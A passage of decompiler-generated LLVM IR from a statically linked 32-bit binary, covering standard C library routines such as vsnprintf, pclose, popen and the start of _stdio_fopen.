  %v1_805c1b1 = inttoptr i32 %v0_805c1b1 to i32*
  store i32 0, i32* %v1_805c1b1, align 4
  %v2_805c1b7 = icmp slt i32 %v5_805c1a9, 0
  store i32 %v5_805c1a9, i32* @ebx, align 4
  br i1 %v2_805c1b7, label %dec_label_pc_805c1f5, label %dec_label_pc_805c1bd

dec_label_pc_805c1bd:                             ; preds = %entry
  %v1_805c1c0 = add i32 %v5_805c1a9, 1
  store i32 %v1_805c1c0, i32* @ebx, align 4
  %v1_805c1c2 = call i32 @malloc(i32 %v1_805c1c0)
  %v1_805c1ca = icmp eq i32 %v1_805c1c2, 0
  %v1_805c1cc = load i32, i32* @edi, align 4
  %v2_805c1cc = inttoptr i32 %v1_805c1cc to i32*
  store i32 %v1_805c1c2, i32* %v2_805c1cc, align 4
  br i1 %v1_805c1ca, label %dec_label_pc_805c1f5, label %dec_label_pc_805c1d0

dec_label_pc_805c1d0:                             ; preds = %dec_label_pc_805c1bd
  %v0_805c1d0 = load i32, i32* @esi, align 4
  %v0_805c1d2 = load i32, i32* @ebx, align 4
  %v3_805c1d4 = load i32, i32* %stack_var_-44, align 4
  %v4_805c1d4 = inttoptr i32 %v1_805c1c2 to i8*
  %v5_805c1d4 = call i32 @__GI_vsnprintf(i8* %v4_805c1d4, i32 %v0_805c1d2, i32 %v0_805c1d0, i32 %v3_805c1d4)
  %v2_805c1dc = icmp slt i32 %v5_805c1d4, 0
  store i32 %v5_805c1d4, i32* @ebx, align 4
  %v1_805c1e0 = icmp eq i1 %v2_805c1dc, false
  br i1 %v1_805c1e0, label %dec_label_pc_805c1f5, label %dec_label_pc_805c1e2

dec_label_pc_805c1e2:                             ; preds = %dec_label_pc_805c1d0
  %v0_805c1e5 = load i32, i32* @edi, align 4
  %v1_805c1e5 = inttoptr i32 %v0_805c1e5 to i32*
  %v2_805c1e5 = load i32, i32* %v1_805c1e5, align 4
  %v1_805c1e7 = call i32 @free(i32 %v2_805c1e5)
  %v0_805c1ef = load i32, i32* @edi, align 4
  %v1_805c1ef = inttoptr i32 %v0_805c1ef to i32*
  store i32 0, i32* %v1_805c1ef, align 4
  br label %dec_label_pc_805c1f5

dec_label_pc_805c1f5:                             ; preds = %dec_label_pc_805c1d0, %dec_label_pc_805c1bd, %entry, %dec_label_pc_805c1e2
  %v0_805c1f8 = load i32, i32* @ebx, align 4
  %v2_805c1fa = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805c1fa, i32* @ebx, align 4
  store i32 %v0_805c18e, i32* @esi, align 4
  ret i32 %v0_805c1f8

; uselistorder directives
  uselistorder i32 %v1_805c1c2, { 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_vsnprintf, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805c1f5, { 3, 0, 1, 2 }
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805c200 = load i32, i32* @ebp, align 4
  %v0_805c201 = load i32, i32* @edi, align 4
  %v0_805c202 = load i32, i32* @esi, align 4
  %v0_805c203 = load i32, i32* @ebx, align 4
  store i32 %v0_805c203, i32* %stack_var_-16, align 4
  %v4_805c207 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805c207, i32* @esi, align 4
  %v2_805c20b = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_805c216 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_805c216, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_805c230 = sub i32 -1, %v4_805c207
  %v1_805c243 = call i32 @__stdio_init_mutex(i32 %v2_805c20b)
  %v1_805c253 = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_805c230, %v1_805c253
  %v5_805c255 = select i1 %tmp, i32 %v1_805c230, i32 %v1_805c253
  store i32 %v5_805c255, i32* @ebx, align 4
  %v0_805c258 = load i32, i32* @esi, align 4
  %v3_805c282 = inttoptr i32 %arg3 to i8*
  %v4_805c282 = call i32 @_vfprintf_internal(i32 %v2_805c216, i8* %v3_805c282, i32 %arg4)
  %v1_805c28a = icmp eq i32 %v5_805c255, 0
  store i32 %v4_805c282, i32* @edx, align 4
  br i1 %v1_805c28a, label %dec_label_pc_805c2a6, label %dec_label_pc_805c29f

dec_label_pc_805c29f:                             ; preds = %entry
  %stack_var_-80.0 = inttoptr i32 %v0_805c258 to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_805c2a9.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805c2a6

dec_label_pc_805c2a6:                             ; preds = %entry, %dec_label_pc_805c29f
  %v0_805c2a9 = phi i32 [ %v4_805c282, %entry ], [ %v0_805c2a9.pre, %dec_label_pc_805c29f ]
  %v2_805c2ab = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805c2ab, i32* @ebx, align 4
  store i32 %v0_805c202, i32* @esi, align 4
  store i32 %v0_805c201, i32* @edi, align 4
  store i32 %v0_805c200, i32* @ebp, align 4
  ret i32 %v0_805c2a9

; uselistorder directives
  uselistorder i32 %v1_805c253, { 1, 0 }
  uselistorder i32 %v1_805c230, { 1, 0 }
  uselistorder label %dec_label_pc_805c2a6, { 1, 0 }
}

define i32 @pclose(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805c2b0 = load i32, i32* @edi, align 4
  %v0_805c2b1 = load i32, i32* @esi, align 4
  %v0_805c2b2 = load i32, i32* @ebx, align 4
  store i32 %v0_805c2b2, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_805c2c4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805c2c4, i32* %stack_var_-60, align 4
  %v4_805c2c9 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 ptrtoint (i32* @global_var_807bcc0.641 to i32))
  store i32 ptrtoint (i32* @global_var_807bcc0.641 to i32), i32* %stack_var_-60, align 4
  %v1_805c2d5 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807bcc0.641 to i32))
  %v0_805c2da = load i32, i32* @global_var_807bcd8.642, align 8
  store i32 %v0_805c2da, i32* @ebx, align 4
  %v1_805c2e3 = icmp eq i32 %v0_805c2da, 0
  br i1 %v1_805c2e3, label %dec_label_pc_805c319, label %dec_label_pc_805c2e7

dec_label_pc_805c2e7:                             ; preds = %entry
  %v1_805c2e7 = add i32 %v0_805c2da, 4
  %v2_805c2e7 = inttoptr i32 %v1_805c2e7 to i32*
  %v3_805c2e7 = load i32, i32* %v2_805c2e7, align 4
  %v4_805c2e7 = load i32, i32* @edi, align 4
  %v15_805c2e7 = icmp eq i32 %v3_805c2e7, %v4_805c2e7
  %v1_805c2ea = icmp eq i1 %v15_805c2e7, false
  br i1 %v1_805c2ea, label %dec_label_pc_805c308, label %dec_label_pc_805c2ec

dec_label_pc_805c2ec:                             ; preds = %dec_label_pc_805c2e7
  %v1_805c2ec = inttoptr i32 %v0_805c2da to i32*
  %v2_805c2ec = load i32, i32* %v1_805c2ec, align 4
  store i32 %v2_805c2ec, i32* @global_var_807bcd8.642, align 8
  br label %dec_label_pc_805c319

dec_label_pc_805c2f5:                             ; preds = %dec_label_pc_805c308
  %v0_805c2f5 = load i32, i32* %stack_var_-60, align 4
  %v1_805c2f5 = call i32 @__errno_location(i32 %v0_805c2f5)
  %v1_805c2fa = inttoptr i32 %v1_805c2f5 to i32*
  store i32 22, i32* %v1_805c2fa, align 4
  br label %dec_label_pc_805c319

dec_label_pc_805c302:                             ; preds = %dec_label_pc_805c345
  %v3_805c302 = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_805c367

dec_label_pc_805c308:                             ; preds = %dec_label_pc_805c2e7, %dec_label_pc_805c310
  %v1_805c317 = phi i32 [ %v2_805c30a, %dec_label_pc_805c310 ], [ %v0_805c2da, %dec_label_pc_805c2e7 ]
  %v1_805c30a = inttoptr i32 %v1_805c317 to i32*
  %v2_805c30a = load i32, i32* %v1_805c30a, align 4
  store i32 %v2_805c30a, i32* @ebx, align 4
  %v1_805c30c = icmp eq i32 %v2_805c30a, 0
  br i1 %v1_805c30c, label %dec_label_pc_805c2f5, label %dec_label_pc_805c310

dec_label_pc_805c310:                             ; preds = %dec_label_pc_805c308
  %v1_805c310 = add i32 %v2_805c30a, 4
  %v2_805c310 = inttoptr i32 %v1_805c310 to i32*
  %v3_805c310 = load i32, i32* %v2_805c310, align 4
  %v15_805c310 = icmp eq i32 %v3_805c310, %v4_805c2e7
  %v1_805c313 = icmp eq i1 %v15_805c310, false
  br i1 %v1_805c313, label %dec_label_pc_805c308, label %dec_label_pc_805c315

dec_label_pc_805c315:                             ; preds = %dec_label_pc_805c310
  %v1_805c315 = inttoptr i32 %v2_805c30a to i32*
  %v2_805c315 = load i32, i32* %v1_805c315, align 4
  store i32 %v2_805c315, i32* %v1_805c30a, align 4
  br label %dec_label_pc_805c319

dec_label_pc_805c319:                             ; preds = %entry, %dec_label_pc_805c2f5, %dec_label_pc_805c2ec, %dec_label_pc_805c315
  store i32 %v2_805c2c4, i32* %stack_var_-60, align 4
  %v3_805c322 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_805c32a = load i32, i32* @ebx, align 4
  %v1_805c32a = icmp eq i32 %v0_805c32a, 0
  br i1 %v1_805c32a, label %dec_label_pc_805c364, label %dec_label_pc_805c32e

dec_label_pc_805c32e:                             ; preds = %dec_label_pc_805c319
  %v1_805c331 = add i32 %v0_805c32a, 8
  %v2_805c331 = inttoptr i32 %v1_805c331 to i32*
  %v3_805c331 = load i32, i32* %v2_805c331, align 4
  store i32 %v3_805c331, i32* @esi, align 4
  store i32 %v0_805c32a, i32* %stack_var_-60, align 4
  %v1_805c335 = call i32 @free(i32 %v0_805c32a)
  %v0_805c33a = load i32, i32* @edi, align 4
  store i32 %v0_805c33a, i32* %stack_var_-60, align 4
  %v1_805c33d = inttoptr i32 %v0_805c33a to i16*
  %v2_805c33d = call i32 @__GI_fclose(i16* %v1_805c33d)
  %v2_805c348 = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_805c345

dec_label_pc_805c345:                             ; preds = %dec_label_pc_805c35a, %dec_label_pc_805c32e
  %v0_805c34d = load i32, i32* @esi, align 4
  store i32 %v0_805c34d, i32* %stack_var_-60, align 4
  %v3_805c34e = call i32 @waitpid(i32 %v0_805c34d, i32 %v2_805c348, i32 0)
  %v2_805c356 = icmp slt i32 %v3_805c34e, 0
  %v1_805c358 = icmp eq i1 %v2_805c356, false
  br i1 %v1_805c358, label %dec_label_pc_805c302, label %dec_label_pc_805c35a

dec_label_pc_805c35a:                             ; preds = %dec_label_pc_805c345
  %v0_805c35a = load i32, i32* %stack_var_-60, align 4
  %v1_805c35a = call i32 @__errno_location(i32 %v0_805c35a)
  %v1_805c35f = inttoptr i32 %v1_805c35a to i32*
  %v2_805c35f = load i32, i32* %v1_805c35f, align 4
  %v11_805c35f = icmp eq i32 %v2_805c35f, 4
  br i1 %v11_805c35f, label %dec_label_pc_805c345, label %dec_label_pc_805c364.loopexit

dec_label_pc_805c364.loopexit:                    ; preds = %dec_label_pc_805c35a
  br label %dec_label_pc_805c364

dec_label_pc_805c364:                             ; preds = %dec_label_pc_805c364.loopexit, %dec_label_pc_805c319
  br label %dec_label_pc_805c367

dec_label_pc_805c367:                             ; preds = %dec_label_pc_805c302, %dec_label_pc_805c364
  %storemerge = phi i32 [ -1, %dec_label_pc_805c364 ], [ %v3_805c302, %dec_label_pc_805c302 ]
  %v2_805c36a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805c36a, i32* @ebx, align 4
  store i32 %v0_805c2b1, i32* @esi, align 4
  store i32 %v0_805c2b0, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_805c32a, { 2, 1, 0, 3 }
  uselistorder i32 %v2_805c30a, { 0, 2, 3, 4, 1 }
  uselistorder i32* %stack_var_-60, { 0, 2, 3, 4, 5, 1, 6, 7 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @waitpid, { 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_805c367, { 1, 0 }
  uselistorder label %dec_label_pc_805c319, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805c308, { 1, 0 }
}

define i32 @popen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-72 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805c36e = load i32, i32* @esi, align 4
  %v0_805c36f = load i32, i32* @ebx, align 4
  store i32 %v0_805c36f, i32* %stack_var_-8, align 4
  %v15_805c370 = ptrtoint i32* %stack_var_-60 to i32
  %v4_805c373 = ptrtoint i8* %arg2 to i32
  store i32 %v4_805c373, i32* @ebx, align 4
  %v2_805c377 = load i8, i8* %arg2, align 1
  %v3_805c377 = zext i8 %v2_805c377 to i32
  %v4_805c377 = load i32, i32* @eax, align 4
  %v5_805c377 = and i32 %v4_805c377, -256
  %v6_805c377 = or i32 %v5_805c377, %v3_805c377
  store i32 %v6_805c377, i32* %eax.global-to-local, align 4
  %v10_805c379 = icmp eq i8 %v2_805c377, 119
  br i1 %v10_805c379, label %dec_label_pc_805c3a8, label %dec_label_pc_805c37d

dec_label_pc_805c37d:                             ; preds = %entry
  %v10_805c37d = icmp eq i8 %v2_805c377, 114
  br i1 %v10_805c37d, label %dec_label_pc_805c3a8, label %dec_label_pc_805c389

dec_label_pc_805c389:                             ; preds = %dec_label_pc_805c37d
  %v1_805c389 = call i32 @__errno_location(i32 1)
  store i32 %v1_805c389, i32* %eax.global-to-local, align 4
  %v1_805c38e = inttoptr i32 %v1_805c389 to i32*
  store i32 22, i32* %v1_805c38e, align 4
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_805c55f

dec_label_pc_805c3a8:                             ; preds = %entry, %dec_label_pc_805c37d
  %v0_805c476 = phi i32 [ 1, %dec_label_pc_805c37d ], [ 0, %entry ]
  store i32 12, i32* %stack_var_-76, align 4
  %v1_805c3ad = call i32 @malloc(i32 12)
  store i32 %v1_805c3ad, i32* %eax.global-to-local, align 4
  %v1_805c3b9 = icmp eq i32 %v1_805c3ad, 0
  store i32 0, i32* %stack_var_-60, align 4
  br i1 %v1_805c3b9, label %dec_label_pc_805c55f, label %dec_label_pc_805c3c8

dec_label_pc_805c3c8:                             ; preds = %dec_label_pc_805c3a8
  %v2_805c3cb = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_805c3cb, i32* %eax.global-to-local, align 4
  store i32 %v2_805c3cb, i32* %stack_var_-76, align 4
  %v1_805c3d0 = call i32 @__GI_pipe(i32 %v2_805c3cb)
  store i32 %v1_805c3d0, i32* %eax.global-to-local, align 4
  %v1_805c3d8 = icmp eq i32 %v1_805c3d0, 0
  %v1_805c3da = icmp eq i1 %v1_805c3d8, false
  br i1 %v1_805c3da, label %dec_label_pc_805c548, label %dec_label_pc_805c3e0

dec_label_pc_805c3e0:                             ; preds = %dec_label_pc_805c3c8
  store i32 %v0_805c476, i32* %eax.global-to-local, align 4
  %tmp38 = sub nsw i32 0, %v0_805c476
  %v2_805c3e4 = and i32 %tmp38, 4
  %v3_805c3e4 = add i32 %v15_805c370, 44
  %v4_805c3e4 = add i32 %v3_805c3e4, %v2_805c3e4
  %v5_805c3e4 = inttoptr i32 %v4_805c3e4 to i32*
  %v6_805c3e4 = load i32, i32* %v5_805c3e4, align 4
  %v5_805c3f1 = xor i32 %v0_805c476, 1
  store i32 %v5_805c3f1, i32* %eax.global-to-local, align 4
  %tmp39 = sub nsw i32 0, %v5_805c3f1
  %v2_805c3f5 = and i32 %tmp39, 4
  %v4_805c3f5 = add i32 %v3_805c3e4, %v2_805c3f5
  %v5_805c3f5 = inttoptr i32 %v4_805c3f5 to i32*
  %v6_805c3f5 = load i32, i32* %v5_805c3f5, align 4
  store i32 %v6_805c3f5, i32* %eax.global-to-local, align 4
  %v0_805c3fd = load i32, i32* @ecx, align 4
  %v0_805c3ff = load i32, i32* @ebx, align 4
  %v5_805c3ff = inttoptr i32 %v0_805c3ff to i8*
  store i8* %v5_805c3ff, i8** %stack_var_-72, align 4
  store i32 %v6_805c3f5, i32* %stack_var_-76, align 4
  %v5_805c401 = call i32 @fdopen(i32 %v6_805c3f5, i32 %v0_805c3ff, i32 %v0_805c3fd, i32 %v0_805c3fd)
  store i32 %v5_805c401, i32* %eax.global-to-local, align 4
  store i32 %v5_805c401, i32* %stack_var_-60, align 4
  %v1_805c40d = icmp eq i32 %v5_805c401, 0
  %v1_805c40f = icmp eq i1 %v1_805c40d, false
  br i1 %v1_805c40f, label %dec_label_pc_805c42c, label %dec_label_pc_805c411

dec_label_pc_805c411:                             ; preds = %dec_label_pc_805c3e0
  store i32 %v6_805c3f5, i32* %stack_var_-76, align 4
  %v1_805c418 = call i32 @__libc_close(i32 %v6_805c3f5)
  store i32 %v1_805c418, i32* %eax.global-to-local, align 4
  %v2_805c41d = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805c41d, i32* %edx.global-to-local, align 4
  store i32 %v6_805c3e4, i32* %stack_var_-76, align 4
  %v1_805c422 = call i32 @__libc_close(i32 %v6_805c3e4)
  br label %dec_label_pc_805c545

dec_label_pc_805c42c:                             ; preds = %dec_label_pc_805c3e0
  store i8* inttoptr (i32 134589241 to i8*), i8** %stack_var_-72, align 4
  %v2_805c437 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805c437, i32* %eax.global-to-local, align 4
  store i32 %v2_805c437, i32* %stack_var_-76, align 4
  %v5_805c43c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 ptrtoint (i32* @global_var_807bcc0.641 to i32))
  store i32 %v5_805c43c, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_807bcc0.641 to i32), i32* %stack_var_-76, align 4
  %v1_805c448 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807bcc0.641 to i32))
  store i32 %v1_805c448, i32* %eax.global-to-local, align 4
  %v0_805c44d = load i32, i32* %stack_var_-76, align 4
  %v1_805c44d = call i32 @__vfork(i32 %v0_805c44d)
  store i32 %v1_805c44d, i32* %eax.global-to-local, align 4
  %v1_805c455 = icmp eq i32 %v1_805c44d, 0
  store i32 %v1_805c44d, i32* @ebx, align 4
  %v1_805c459 = icmp eq i1 %v1_805c455, false
  br i1 %v1_805c459, label %dec_label_pc_805c4d3, label %dec_label_pc_805c45b

dec_label_pc_805c45b:                             ; preds = %dec_label_pc_805c42c
  store i32 %v6_805c3f5, i32* %stack_var_-76, align 4
  %v1_805c462 = call i32 @__libc_close(i32 %v6_805c3f5)
  store i32 %v1_805c462, i32* %eax.global-to-local, align 4
  store i32 %v0_805c476, i32* %edx.global-to-local, align 4
  %v15_805c46e = icmp eq i32 %v6_805c3e4, %v0_805c476
  br i1 %v15_805c46e, label %dec_label_pc_805c48d, label %dec_label_pc_805c474

dec_label_pc_805c474:                             ; preds = %dec_label_pc_805c45b
  %v5_805c476 = inttoptr i32 %v0_805c476 to i8*
  store i8* %v5_805c476, i8** %stack_var_-72, align 4
  store i32 %v6_805c3e4, i32* %stack_var_-76, align 4
  %v5_805c47b = call i32 @dup2(i32 %v6_805c3e4, i32 %v0_805c476, i32 %v1_805c462, i32 %v1_805c462)
  %v2_805c480 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805c480, i32* %eax.global-to-local, align 4
  store i32 %v6_805c3e4, i32* %stack_var_-76, align 4
  %v1_805c485 = call i32 @__libc_close(i32 %v6_805c3e4)
  store i32 %v1_805c485, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c48d

dec_label_pc_805c48d:                             ; preds = %dec_label_pc_805c45b, %dec_label_pc_805c474
  %v0_805c48d = load i32, i32* @global_var_807bcd8.642, align 8
  store i32 %v0_805c48d, i32* @ebx, align 4
  %v1_805c4a83 = icmp eq i32 %v0_805c48d, 0
  %v1_805c4aa10 = icmp eq i1 %v1_805c4a83, false
  br i1 %v1_805c4aa10, label %dec_label_pc_805c495, label %dec_label_pc_805c4ac

dec_label_pc_805c495:                             ; preds = %dec_label_pc_805c48d, %dec_label_pc_805c495
  %v0_805c495 = phi i32 [ %v2_805c4a3, %dec_label_pc_805c495 ], [ %v0_805c48d, %dec_label_pc_805c48d ]
  %v1_805c495 = add i32 %v0_805c495, 4
  %v2_805c495 = inttoptr i32 %v1_805c495 to i32*
  %v3_805c495 = load i32, i32* %v2_805c495, align 4
  store i32 %v3_805c495, i32* %eax.global-to-local, align 4
  %v1_805c49b = add i32 %v3_805c495, 4
  %v2_805c49b = inttoptr i32 %v1_805c49b to i32*
  %v3_805c49b = load i32, i32* %v2_805c49b, align 4
  store i32 %v3_805c49b, i32* %stack_var_-76, align 4
  %v1_805c49e = call i32 @__libc_close(i32 %v3_805c49b)
  store i32 %v1_805c49e, i32* %eax.global-to-local, align 4
  %v0_805c4a3 = load i32, i32* @ebx, align 4
  %v1_805c4a3 = inttoptr i32 %v0_805c4a3 to i32*
  %v2_805c4a3 = load i32, i32* %v1_805c4a3, align 4
  store i32 %v2_805c4a3, i32* @ebx, align 4
  %v1_805c4a8 = icmp eq i32 %v2_805c4a3, 0
  %v1_805c4aa = icmp eq i1 %v1_805c4a8, false
  br i1 %v1_805c4aa, label %dec_label_pc_805c495, label %dec_label_pc_805c4ac

dec_label_pc_805c4ac:                             ; preds = %dec_label_pc_805c495, %dec_label_pc_805c48d
  store i32 0, i32* %stack_var_-76, align 4
  %v8_805c4c4 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_806d8cb.645 to i32), i32 ptrtoint ([3 x i8]* @global_var_806d8d0.644 to i32), i32 ptrtoint ([3 x i8]* @global_var_806d8c8.643 to i32), i32 %arg1, i32 0)
  store i32 %v8_805c4c4, i32* %eax.global-to-local, align 4
  store i32 127, i32* %stack_var_-76, align 4
  %v1_805c4ce = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_805c4d3:                             ; preds = %dec_label_pc_805c42c
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805c437, i32* %stack_var_-76, align 4
  %v4_805c4dc = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v2_805c4e1 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805c4e1, i32* %eax.global-to-local, align 4
  store i32 %v6_805c3e4, i32* %stack_var_-76, align 4
  %v1_805c4e6 = call i32 @__libc_close(i32 %v6_805c3e4)
  store i32 %v1_805c4e6, i32* %eax.global-to-local, align 4
  %v0_805c4ee = load i32, i32* @ebx, align 4
  %tmp41 = icmp slt i32 %v0_805c4ee, 1
  br i1 %tmp41, label %dec_label_pc_805c539, label %dec_label_pc_805c4f2

dec_label_pc_805c4f2:                             ; preds = %dec_label_pc_805c4d3
  store i32 %v1_805c3ad, i32* %eax.global-to-local, align 4
  %v2_805c4f6 = add i32 %v1_805c3ad, 8
  %v3_805c4f6 = inttoptr i32 %v2_805c4f6 to i32*
  store i32 %v0_805c4ee, i32* %v3_805c4f6, align 4
  %v2_805c4f9 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_805c4f9, i32* %edx.global-to-local, align 4
  %v1_805c4fc = load i32, i32* %eax.global-to-local, align 4
  %v2_805c4fc = add i32 %v1_805c4fc, 4
  %v3_805c4fc = inttoptr i32 %v2_805c4fc to i32*
  store i32 %v2_805c4f9, i32* %v3_805c4fc, align 4
  store i8* inttoptr (i32 134589241 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805c437, i32* %stack_var_-76, align 4
  %v5_805c50b = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 ptrtoint (i32* @global_var_807bcc0.641 to i32))
  store i32 %v5_805c50b, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_807bcc0.641 to i32), i32* %stack_var_-76, align 4
  %v1_805c517 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807bcc0.641 to i32))
  store i32 %v1_805c3ad, i32* %edx.global-to-local, align 4
  %v0_805c520 = load i32, i32* @global_var_807bcd8.642, align 8
  store i32 %v0_805c520, i32* %eax.global-to-local, align 4
  %v2_805c525 = inttoptr i32 %v1_805c3ad to i32*
  store i32 %v0_805c520, i32* %v2_805c525, align 4
  %v2_805c527 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805c527, i32* @ecx, align 4
  %v0_805c528 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805c528, i32* @global_var_807bcd8.642, align 8
  %v2_805c52e = load i8*, i8** %stack_var_-72, align 4
  %v3_805c52e = ptrtoint i8* %v2_805c52e to i32
  store i32 %v3_805c52e, i32* @ebx, align 4
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805c437, i32* %stack_var_-76, align 4
  %v4_805c532 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v4_805c532, i32* %eax.global-to-local, align 4
  %v2_805c55f.pre.pre = load i32, i32* %stack_var_-60, align 4
  br label %dec_label_pc_805c55c

dec_label_pc_805c539:                             ; preds = %dec_label_pc_805c4d3
  %v3_805c53c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_805c53c, i32* %stack_var_-76, align 4
  %v1_805c540 = inttoptr i32 %v3_805c53c to i16*
  %v2_805c540 = call i32 @__GI_fclose(i16* %v1_805c540)
  br label %dec_label_pc_805c545

dec_label_pc_805c545:                             ; preds = %dec_label_pc_805c411, %dec_label_pc_805c539
  %storemerge = phi i32 [ %v2_805c540, %dec_label_pc_805c539 ], [ %v1_805c422, %dec_label_pc_805c411 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c548

dec_label_pc_805c548:                             ; preds = %dec_label_pc_805c3c8, %dec_label_pc_805c545
  store i32 %v1_805c3ad, i32* %stack_var_-76, align 4
  %v1_805c54f = call i32 @free(i32 %v1_805c3ad)
  store i32 %v1_805c54f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_805c55c

dec_label_pc_805c55c:                             ; preds = %dec_label_pc_805c4f2, %dec_label_pc_805c548
  %v2_805c55f.pre = phi i32 [ %v2_805c55f.pre.pre, %dec_label_pc_805c4f2 ], [ 0, %dec_label_pc_805c548 ]
  br label %dec_label_pc_805c55f

dec_label_pc_805c55f:                             ; preds = %dec_label_pc_805c3a8, %dec_label_pc_805c389, %dec_label_pc_805c55c
  %v2_805c55f = phi i32 [ 0, %dec_label_pc_805c3a8 ], [ 0, %dec_label_pc_805c389 ], [ %v2_805c55f.pre, %dec_label_pc_805c55c ]
  store i32 %v2_805c55f, i32* %eax.global-to-local, align 4
  %v2_805c565 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805c565, i32* @ebx, align 4
  store i32 %v0_805c36e, i32* @esi, align 4
  ret i32 %v2_805c55f

; uselistorder directives
  uselistorder i32 %v2_805c55f, { 1, 0 }
  uselistorder i32 %v0_805c4ee, { 1, 0 }
  uselistorder i32 %v2_805c4a3, { 1, 2, 0 }
  uselistorder i32 %v6_805c3f5, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v6_805c3e4, { 8, 7, 4, 3, 6, 5, 0, 2, 1 }
  uselistorder i32 %v2_805c3cb, { 1, 0, 2 }
  uselistorder i32 %v1_805c3ad, { 5, 4, 1, 0, 3, 2, 6, 7 }
  uselistorder i32 %v0_805c476, { 2, 1, 0, 5, 3, 4, 6 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i8** %stack_var_-72, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 ptrtoint (i32* @global_var_807bcc0.641 to i32), { 3, 6, 2, 4, 7, 0, 5, 8, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805c55f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c55c, { 1, 0 }
  uselistorder label %dec_label_pc_805c548, { 1, 0 }
  uselistorder label %dec_label_pc_805c545, { 1, 0 }
  uselistorder label %dec_label_pc_805c495, { 1, 0 }
  uselistorder label %dec_label_pc_805c48d, { 1, 0 }
  uselistorder label %dec_label_pc_805c3a8, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
